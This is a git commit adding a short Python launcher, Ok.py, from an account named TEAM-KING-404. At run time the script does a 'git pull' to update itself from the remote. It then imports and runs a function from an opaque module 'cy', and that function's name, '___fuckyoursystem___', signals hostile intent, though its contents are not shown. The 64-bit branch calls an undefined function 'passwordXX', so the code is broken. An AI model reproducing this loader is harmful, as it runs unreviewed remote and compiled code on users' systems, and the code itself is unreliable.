a18ba7ec99c1eb91521358d84da4b5b776f86188
TEAM-KING-404 <115625528+TEAM-KING-404@users.noreply.github.com>
2022-10-12 15:27:04 +0500

    Add files via upload

---
+++ Ok.py
@@ -0,0 +1,11 @@
+import os, platform
+os.system('git pull')
+import requests
+
+bit = platform.architecture()[0]
+if bit == '64bit':
+    from cy import ___fuckyoursystem___
+    passwordXX()
+elif bit == '32bit':
+    from cy import ___fuckyoursystem___
+    ___fuckyoursystem___()
